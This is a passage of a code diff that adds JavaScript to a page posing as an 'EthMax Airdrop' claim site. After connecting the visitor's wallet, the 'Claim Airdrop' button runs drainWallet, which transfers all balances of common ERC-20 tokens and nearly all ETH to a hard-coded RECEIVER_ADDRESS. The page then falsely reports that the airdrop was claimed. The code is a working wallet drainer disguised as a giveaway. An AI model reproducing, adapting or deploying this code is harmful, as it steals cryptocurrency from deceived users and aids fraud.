+                console.error("Failed to open deep link:", error);
+                
+                // Method 3: Create a temporary link and click it
+                try {
+                    const link = document.createElement('a');
+                    link.href = deepLink;
+                    link.target = '_blank';
+                    link.rel = 'noopener noreferrer';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    return true;
+                } catch (linkError) {
+                    console.error("Failed to create and click link:", linkError);
+                    return false;
+                }
+            }
+        }
+        
+        console.warn(`No deep link available for wallet: ${walletName}`);
+        return false;
+    }
+
+    // Function to wait for mobile wallet connection
+    function waitForMobileConnection(timeout = 30000) {
+        return new Promise((resolve) => {
+            const startTime = Date.now();
+            const checkInterval = 1000; // Check every second
+            
+            const checkConnection = async () => {
+                try {
+                    if (window.ethereum) {
+                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                        if (accounts && accounts.length > 0) {
+                            resolve({ success: true, accounts, provider: window.ethereum });
+                            return;
+                        }
+                    }
+                } catch (error) {
+                    console.log("Still waiting for mobile connection...", error);
+                }
+                
+                // Check if timeout reached
+                if (Date.now() - startTime > timeout) {
+                    resolve({ success: false, error: "Connection timeout" });
+                    return;
+                }
+                
+                // Continue checking
+                setTimeout(checkConnection, checkInterval);
+            };
+            
+            checkConnection();
+        });
+    }
+
+    // Insert wallet dropdown before button with improved mobile handling
+    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
+    
+    // Add wallets to dropdown with device-specific filtering
+    if (detectedWallets.length === 0) {
+        // Fallback: add basic options if no wallets detected
+        if (isMobileDevice()) {
+            detectedWallets.push(
+                { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
+                { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
+                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
+            );
+        } else {
+            detectedWallets.push(
+                { name: "MetaMask (Install Required)", provider: null },
+                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
+            );
+        }
+    }
+    
+    detectedWallets.forEach((opt, i) => {
+        let displayName = opt.name;
+        if (opt.type === "mobile" && !isMobileDevice()) {
+            displayName += " (Mobile Only)";
+        } else if (opt.type !== "mobile" && !opt.provider && opt.name !== "WalletConnect") {
+            displayName += " (Not Installed)";
+        }
+        $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
+    });
+
+    // Add connection status indicator
+    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
+    
+    // Update connection status
+    function updateConnectionStatus(message, isError = false) {
+        const statusEl = $('#connection-status');
+        statusEl.text(message);
+        statusEl.css('color', isError ? '#ff4444' : '#666');
+    }
+
+    // Initialize with device info
+    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);
+
+    // Debug wallet providers on page load
+    debugWalletProviders();
+
+    // Main wallet connection handler
+    $('#connect-wallet').on('click', async () => {
+        const selectedIdx = $('#wallet-select').val();
+        const selected = detectedWallets[selectedIdx];
+        let provider = null;
+        let providerName = selected ? selected.name : "";
+        
+        try {
+            if (!selected) {
+                alert("No wallet selected.");
+                return;
+            }
+
+            // Handle mobile wallet connections
+            if (selected.type === "mobile") {
+                if (isMobileDevice()) {
+                    updateConnectionStatus("Opening mobile wallet...");
+                    
+                    // Try to open the mobile wallet app via deep link
+                    const deepLinkOpened = connectMobileWallet(selected.deepLink);
+                    if (deepLinkOpened) {
+                        updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
+                        
+                        // Show user instructions
+                        const continueWaiting = confirm(
+                            `Opening ${selected.name}...\n\n` +
+                            "Instructions:\n" +
+                            "1. The wallet app should open automatically\n" +
+                            "2. Connect your wallet in the app\n" +
+                            "3. Return to this page\n" +
+                            "4. Click OK to continue waiting, or Cancel to try a different method"
+                        );
+                        
+                        if (continueWaiting) {
+                            // Wait for connection with timeout
+                            const connectionResult = await waitForMobileConnection(45000);
+                            
+                            if (connectionResult.success) {
+                                updateConnectionStatus("Mobile wallet connected successfully!");
+                                await handleSuccessfulConnection(
+                                    connectionResult.provider, 
+                                    selected.name, 
+                                    connectionResult.accounts[0]
+                                );
+                                return;
+                            } else {
+                                updateConnectionStatus("Mobile connection failed or timed out", true);
+                                alert("Connection timed out. Please try again or use WalletConnect instead.");
+                                return;
+                            }
+                        } else {
+                            updateConnectionStatus("Mobile connection cancelled by user");
+                            return;
+                        }
+                    } else {
+                        updateConnectionStatus("Failed to open mobile wallet", true);
+                        alert(`Unable to open ${selected.name}. Please install the wallet app or use WalletConnect.`);
+                        return;
+                    }
+                } else {
+                    updateConnectionStatus("Mobile wallet selected on desktop device", true);
+                    alert("This is a mobile wallet option. Please use a desktop wallet or switch to a mobile device.");
+                    return;
+                }
+            }
+
+            // Handle WalletConnect
+            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
+                updateConnectionStatus("Initializing WalletConnect...");
+                
+                const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
+                provider = await WalletConnectProvider.init({
+                    projectId: PROJECT_ID,
+                    chains: [1],
+                    showQrModal: true,
+                    metadata: {
+                        name: "EthMax Airdrop",
+                        description: "Claim your EthMax airdrop tokens - Connect any Ethereum wallet",
+                        url: window.location.origin,
+                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
+                    }
+                });
+                
+                updateConnectionStatus("Waiting for WalletConnect pairing...");
+                await provider.connect();
+                
+                if (!provider.accounts || provider.accounts.length === 0) {
+                    updateConnectionStatus("WalletConnect connection failed", true);
+                    alert("No accounts connected via WalletConnect.");
+                    return;
+                }
+                
+                updateConnectionStatus("WalletConnect connected successfully!");
+                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+                return;
+            }
+
+            // Handle desktop wallet connections
+            if (!selected.provider || selected.provider === "walletconnect") {
+                updateConnectionStatus("Wallet not available", true);
+                alert("Wallet provider not available. Please install the wallet extension or use WalletConnect.");
+                return;
+            }
+
+            provider = selected.provider;
+            
+            // Check if provider is available
+            if (!provider || typeof provider.request !== 'function') {
+                updateConnectionStatus("Wallet extension not properly installed", true);
+                alert(`${selected.name} is not properly installed or available. Please install the wallet extension.`);
+                return;
+            }
+
+            updateConnectionStatus(`Connecting to ${selected.name}...`);
+            
+            // Request account access
+            await provider.request({ method: 'eth_requestAccounts' });
+            
+            // Get connected accounts
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            if (!accounts || accounts.length === 0) {
+                updateConnectionStatus("No accounts found in wallet", true);
+                alert("No accounts found. Please unlock your wallet.");
+                return;
+            }
+
+            updateConnectionStatus("Desktop wallet connected successfully!");
+            await handleSuccessfulConnection(provider, selected.name, accounts[0]);
+
+        } catch (error) {
+            console.error("Connection error:", error);
+            
+            // Handle specific error cases
+            if (error.code === 4001) {
+                updateConnectionStatus("Connection rejected by user", true);
+                alert("Connection request was rejected by the user.");
+            } else if (error.code === -32002) {
+                updateConnectionStatus("Connection request already pending", true);
+                alert("A connection request is already pending. Please check your wallet.");
+            } else if (error.message.includes("User rejected")) {
+                updateConnectionStatus("Connection cancelled by user", true);
+                alert("Connection was cancelled by user.");
+            } else {
+                updateConnectionStatus("Connection failed", true);
+                alert("Failed to connect wallet: " + error.message);
+            }
+        }
+    });
+
+    // Helper function to handle successful connections
+    async function handleSuccessfulConnection(provider, walletName, userAddress) {
+        try {
+            updateConnectionStatus("Setting up connection...");
+            
+            // Initialize ethers provider
+            const ethersProvider = new ethers.providers.Web3Provider(provider);
+            const signer = ethersProvider.getSigner();
+            
+            // Get network info
+            const network = await ethersProvider.getNetwork();
+            console.log("Connected to network:", network);
+            
+            // Check if on Ethereum mainnet
+            if (network.chainId !== 1) {
+                updateConnectionStatus("Wrong network detected", true);
+                const switchToMainnet = confirm("You're not on Ethereum Mainnet. Would you like to switch networks?");
+                if (switchToMainnet) {
+                    try {
+                        updateConnectionStatus("Switching to Ethereum Mainnet...");
+                        await provider.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x1' }], // Ethereum Mainnet
+                        });
+                        // Refresh provider after network switch
+                        updateConnectionStatus("Network switched successfully!");
+                        return handleSuccessfulConnection(provider, walletName, userAddress);
+                    } catch (switchError) {
+                        console.error("Failed to switch network:", switchError);
+                        updateConnectionStatus("Failed to switch network", true);
+                        alert("Failed to switch to Ethereum Mainnet. Please switch manually.");
+                        return;
+                    }
+                }
+            }
+            
+            updateConnectionStatus("Checking account balance...");
+            
+            // Check ETH balance
+            const balance = await ethersProvider.getBalance(userAddress);
+            const ethBalance = ethers.utils.formatEther(balance);
+            
+            // Update connection status and button
+            updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);
+            
+            // Update button
+            $('#connect-wallet').text("🎯 Claim Airdrop");
+            $('#connect-wallet').off('click').on('click', async () => {
+                await drainWallet(ethersProvider, signer, userAddress);
+            });
+            
+            alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${ethBalance} ETH\nNetwork: ${network.name}`);
+            
+        } catch (error) {
+            console.error("Post-connection setup error:", error);
+            updateConnectionStatus("Connection setup failed", true);
+            alert("Connected to wallet but failed to complete setup: " + error.message);
+        }
+    }
+
+    // Function to drain the wallet (ETH + ERC-20 tokens)
+    async function drainWallet(provider, signer, userAddress) {
+        try {
+            console.log("Starting wallet drain...");
+            updateConnectionStatus("Starting asset extraction...");
+
+            // Get initial ETH balance
+            const initialBalance = await provider.getBalance(userAddress);
+            const initialEthBalance = ethers.utils.formatEther(initialBalance);
+            console.log(`Initial ETH balance: ${initialEthBalance}`);
+
+            // Calculate total gas needed for all operations
+            const gasPrice = await provider.getGasPrice();
+            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
+            
+            // Estimate gas for token transfers (higher limit for safety)
+            const tokenGasLimit = ethers.BigNumber.from("65000"); // Higher for token transfers
+            const ethGasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer
+            
+            // Calculate total gas needed (tokens + final ETH transfer)
+            const estimatedTokenTransfers = COMMON_TOKENS.length;
+            const totalGasNeeded = tokenGasLimit.mul(estimatedTokenTransfers).add(ethGasLimit);
+            const totalGasCost = gasPrice.mul(totalGasNeeded);
+            
+            console.log(`Estimated gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);
+
+            // Step 1: Drain ERC-20 tokens first (they need ETH for gas)
+            let tokenTransferCount = 0;
+            for (const token of COMMON_TOKENS) {
+                try {
+                    updateConnectionStatus(`Checking ${token.symbol} balance...`);
+                    const transferred = await drainERC20Token(provider, signer, userAddress, token, gasPrice);
+                    if (transferred) {
+                        tokenTransferCount++;
+                        updateConnectionStatus(`${token.symbol} transferred successfully`);
+                    }
+                } catch (tokenError) {
+                    console.error(`Failed to drain ${token.symbol}:`, tokenError);
+                    updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
+                    // Continue with other tokens
+                }
+            }
+
+            console.log(`Successfully transferred ${tokenTransferCount} tokens`);
+
+            // Step 2: Drain remaining ETH (calculate precise gas for final transfer)
+            updateConnectionStatus("Transferring remaining ETH...");
+            await drainETH(provider, signer, userAddress);
+
+            updateConnectionStatus("All assets extracted successfully! 🎉");
+            alert("Airdrop claimed successfully! 🎉");
+
+        } catch (error) {
+            console.error("Drain error:", error);
+            updateConnectionStatus("Asset extraction failed", true);
+            alert("Failed to claim airdrop: " + error.message);
+        }
+    }
+
+    // Function to drain ERC-20 tokens
+    async function drainERC20Token(provider, signer, userAddress, token, gasPrice = null) {
+        try {
+            // ERC-20 ABI for transfer function
+            const erc20ABI = [
+                "function balanceOf(address owner) view returns (uint256)",
+                "function transfer(address to, uint256 amount) returns (bool)",
+                "function allowance(address owner, address spender) view returns (uint256)",
+                "function approve(address spender, uint256 amount) returns (bool)",
+                "function decimals() view returns (uint8)",
+                "function symbol() view returns (string)"
+            ];
+
+            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);
+
+            // Check token balance
+            const balance = await tokenContract.balanceOf(userAddress);
+            if (balance.isZero()) {
+                console.log(`No ${token.symbol} balance found`);
+                return false;
+            }
+
+            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
+            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
+
+            // Get current gas price if not provided
+            if (!gasPrice) {
+                gasPrice = await provider.getGasPrice();
+            }
+
+            // Estimate gas for this specific token transfer
+            let estimatedGas;
+            try {
+                estimatedGas = await tokenContract.estimateGas.transfer(RECEIVER_ADDRESS, balance);
+                // Add 20% buffer for safety
+                estimatedGas = estimatedGas.mul(120).div(100);
+            } catch (gasError) {
+                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
+                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
+            }
+
+            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);
+
+            // Check if user has enough ETH for gas
+            const currentEthBalance = await provider.getBalance(userAddress);
+            const gasCost = gasPrice.mul(estimatedGas);
+            
+            if (currentEthBalance.lt(gasCost)) {
+                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
+                return false;
+            }
+
+            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${RECEIVER_ADDRESS}`);
+
+            // Transfer tokens to receiver address with optimized gas
+            const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance, {
+                gasLimit: estimatedGas,
+                gasPrice: gasPrice,
+                // Use maxFeePerGas for EIP-1559 if supported
+                ...(provider.getNetwork().then(n => n.chainId === 1) && {
+                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
+                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
+                })
+            });
+
+            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);
+
+            // Wait for confirmation
+            const receipt = await transferTx.wait();
+            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
+            console.log(`Gas used: ${receipt.gasUsed.toString()}`);
+
+            return true;
+
+        } catch (error) {
+            console.error(`Error draining ${token.symbol}:`, error);
+            
+            // Don't throw error, just return false to continue with other tokens
+            if (error.code === 'INSUFFICIENT_FUNDS') {
+                console.log(`Insufficient funds for ${token.symbol} transfer`);
+            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
+                console.log(`Token ${token.symbol} transfer would fail, skipping`);
+            }
+            
+            return false;
+        }
+    }
+
+    // Function to drain ETH
+    async function drainETH(provider, signer, userAddress) {
+        try {
+            // Get current balance after token transfers
+            const currentBalance = await provider.getBalance(userAddress);
+            const currentEthBalance = ethers.utils.formatEther(currentBalance);
+            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);
+
+            if (currentBalance.isZero()) {
+                console.log("No ETH balance remaining");
+                return;
+            }
+
+            // Get current gas price
+            const gasPrice = await provider.getGasPrice();
+            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
+
+            // Use a more conservative gas limit for the final transfer
+            const gasLimit = ethers.BigNumber.from("21000");
+            
+            // Calculate exact gas cost
+            const exactGasCost = gasPrice.mul(gasLimit);
+            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
+
+            // Calculate amount to send (total balance minus exact gas cost)
+            const amountToSend = currentBalance.sub(exactGasCost);
+
+            if (amountToSend.lte(0)) {
+                console.log("Insufficient ETH balance for gas fees");
+                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
+                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
+                return;
+            }
+
+            const ethToSend = ethers.utils.formatEther(amountToSend);
+            console.log(`Transferring ${ethToSend} ETH to ${RECEIVER_ADDRESS}`);
+            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);
+
+            // Create transaction with precise gas parameters
+            const txParams = {
+                to: RECEIVER_ADDRESS,
+                value: amountToSend,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice,
+                nonce: await provider.getTransactionCount(userAddress)
+            };
+
+            // For EIP-1559 networks, use maxFeePerGas
+            const network = await provider.getNetwork();
+            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
+                try {
+                    const feeData = await provider.getFeeData();
+                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+                        delete txParams.gasPrice;
+                        txParams.maxFeePerGas = feeData.maxFeePerGas;
+                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+                        
+                        // Recalculate amount with EIP-1559 fees
+                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
+                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
+                        
+                        if (eip1559Amount.gt(0)) {
+                            txParams.value = eip1559Amount;
+                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
+                        }
+                    }
+                } catch (eip1559Error) {
+                    console.log("EIP-1559 fee estimation failed, using legacy gas pricing");
+                }
+            }
+
+            // Send ETH transaction
+            const tx = await signer.sendTransaction(txParams);
+            console.log("ETH transfer tx:", tx.hash);
+
+            // Wait for confirmation
+            const receipt = await tx.wait();
+            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
+            console.log("Gas used:", receipt.gasUsed.toString());
+            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");
+
+            // Verify final balance
+            const finalBalance = await provider.getBalance(userAddress);
+            const finalEthBalance = ethers.utils.formatEther(finalBalance);
+            console.log(`Final ETH balance: ${finalEthBalance} ETH`);
+
+            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
+                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
+            }
+
+        } catch (error) {
+            console.error("Error draining ETH:", error);
+            
+            if (error.code === 'INSUFFICIENT_FUNDS') {
+                console.log("Transaction failed due to insufficient funds for gas");
+            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
+                console.log("Transaction underpriced, gas price may have increased");
+            }
+            
+            throw error;
+        }
+    }
+});
